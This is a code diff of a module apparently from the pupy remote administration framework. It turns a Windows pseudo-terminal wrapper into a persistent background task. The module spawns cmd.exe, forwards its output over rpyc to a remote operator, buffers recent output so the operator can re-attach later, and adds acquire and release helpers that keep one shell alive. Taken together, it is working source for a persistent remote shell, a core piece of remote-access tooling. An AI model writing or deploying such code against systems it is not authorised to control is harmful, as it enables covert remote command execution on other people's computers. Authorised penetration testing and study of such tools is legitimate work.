@@ -1,28 +1,32 @@
 # -*- coding: utf-8 -*-
 
+__all__ = [ 'acquire', 'release' ]
+
 import rpyc
 import winpty
-import threading
 
-class PtyShell(object):
-    def __init__(self):
+from collections import deque
+from pupy import manager, Task
+
+class PtyShell(Task):
+    __slots__ = (
+        'pty', 'argv', 'term', 'suid',
+        'read_cb', 'close_cb', '_buffer'
+    )
+
+    def __init__(self, manager, argv=None, term=None, suid=None):
+        super(PtyShell, self).__init__(manager)
+
         self.pty = None
 
-    def close(self):
-        if self.pty:
-            self.pty.close()
+        self.argv = argv
+        self.term = term
+        self.suid = suid
 
-    def __del__(self):
-        self.close()
+        self.read_cb = None
+        self.close_cb = None
 
-    def spawn(self, argv=None, term=None, suid=None):
-        if self.pty:
-            return
-
-        if not argv:
-            argv = r'C:\windows\system32\cmd.exe'
-
-        self.pty = winpty.WinPTY(argv)
+        self._buffer = deque(maxlen=50)
 
     def write(self, data):
         if not self.pty:
@@ -36,33 +40,80 @@ class PtyShell(object):
 
         self.pty.resize(ws_row, ws_col)
 
-    def start_read_loop(self, print_callback, close_callback):
-        if not self.pty:
-            return
+    def attach(self, read_cb, close_cb):
+        if self.active:
+            self.read_cb = rpyc.async(read_cb)
+            self.close_cb = rpyc.async(close_cb)
 
-        t=threading.Thread(
-            target=self._read_loop,
-            args=(print_callback, close_callback)
-        )
+            if self._buffer:
+                for item in self._buffer:
+                    self.read_cb(item)
+        else:
+            close_cb()
 
-        t.daemon=True
-        t.start()
+    def detach(self):
+        self.read_cb = None
+        self.close_cb = None
 
-    def _read_loop(self, print_callback, close_callback):
-        cb = rpyc.async(print_callback)
-        close_cb = rpyc.async(close_callback)
+    def task(self):
 
-        while True:
+        argv = self.argv
+        if not argv:
+            argv = r'C:\windows\system32\cmd.exe'
+
+        try:
+            self.pty = winpty.WinPTY(argv)
+
+            if self.pty:
+                self._read_loop()
+
+        finally:
+            try:
+                self.stop()
+            except:
+                pass
+
+            try:
+                if self.close_cb:
+                    self.close_cb()
+            except:
+                pass
+
+    def _read_loop(self):
+        while self.active:
             data = self.pty.read()
             if not data:
                 break
 
-            cb(data)
+            self._buffer.append(data)
 
-        close_cb()
+            if self.read_cb:
+                self.read_cb(data)
+
+    def stop(self):
+        super(PtyShell, self).stop()
+        self.close()
 
     def close(self):
         if not self.pty:
             return
 
         self.pty.close()
+        self.pty = None
+
+
+def acquire(argv=None, term=None, suid=None):
+    shell = manager.get(PtyShell)
+
+    new = False
+    if not ( shell and shell.active ):
+        shell = manager.create(
+            PtyShell,
+            argv, term, suid)
+
+        new = True
+
+    return new, shell
+
+def release():
+    manager.stop(PtyShell)
